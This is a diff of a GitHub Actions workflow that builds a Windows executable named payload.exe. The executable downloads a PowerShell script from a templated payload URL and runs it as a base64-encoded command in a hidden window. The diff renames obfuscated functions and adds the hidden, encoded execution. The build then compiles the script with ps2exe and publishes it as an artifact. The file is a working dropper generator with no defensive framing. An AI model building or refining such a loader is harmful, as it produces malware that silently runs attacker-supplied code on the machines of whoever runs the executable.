@@ -13,49 +13,43 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    # Step 1: Checkout repository
     - name: Checkout Code
       uses: actions/checkout@v3
 
-    # Step 2: Install ps2exe module
     - name: Install ps2exe Module
       shell: powershell
       run: Install-Module -Name ps2exe -Force -Scope CurrentUser
 
-    # Step 3: Save PowerShell Script with Dynamic URL Injection
     - name: Save PowerShell Script with URL Injection
       shell: powershell
       run: |
         $script = @'
-        function XhYjVwJtKz {
-            param ([string]$AaBbCcDdEe)
+        function FetchScriptContent {
+            param ([string]$scriptUrl)
             try {
-                $httpClient = New-Object System.Net.Http.HttpClient
-                $httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-                return $httpClient.GetStringAsync($AaBbCcDdEe).Result
-            }
-            catch {
-                Write-Host "Error: Failed to fetch data from URL - $AaBbCcDdEe"
+                return Invoke-RestMethod -Uri $scriptUrl -UseBasicParsing
+            } catch {
+                Write-Host "Error: Failed to fetch data from URL - $scriptUrl"
                 return $null
             }
         }
 
-        function XoRpQkZtLs {
+        function ExecuteScript {
             param ([string]$scriptContent)
             try {
-                Invoke-Expression $scriptContent
-            }
-            catch {
-                Write-Host "Error: Failed to execute PowerShell command."
+                $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptContent))
+                Start-Process -FilePath "powershell.exe" -ArgumentList "-EncodedCommand $encodedCommand" -WindowStyle Hidden
+            } catch {
+                Write-Host "Error: Failed to execute PowerShell script."
             }
         }
 
-        $QwErTyUuOo = "{PAYLOAD_URL}"
+        $PayloadURL = "{PAYLOAD_URL}"
 
-        if ($QwErTyUuOo) {
-            $VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo
-            if ($VvWwXxYyZz) {
-                XoRpQkZtLs -scriptContent $VvWwXxYyZz
+        if ($PayloadURL) {
+            $ScriptData = FetchScriptContent -scriptUrl $PayloadURL
+            if ($ScriptData) {
+                ExecuteScript -scriptContent $ScriptData
             } else {
                 Write-Host "Error: No valid data received from the URL."
             }
@@ -70,22 +64,20 @@ jobs:
         # Save to file
         $script | Out-File -FilePath "payload.ps1" -Encoding utf8
 
-    # Step 4: Convert PowerShell script to an EXE using ps2exe
     - name: Convert PowerShell Script to EXE
       shell: powershell
       run: ps2exe -inputFile '.\payload.ps1' -outputFile '.\payload.exe'
 
-    # Step 5: List the contents of the output directory
     - name: List Directory Contents
       shell: powershell
       run: Get-ChildItem -Path .
 
-    # Step 6: Upload the generated EXE as an artifact
     - name: Upload Executable
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
         path: payload.exe
+
 
 
 
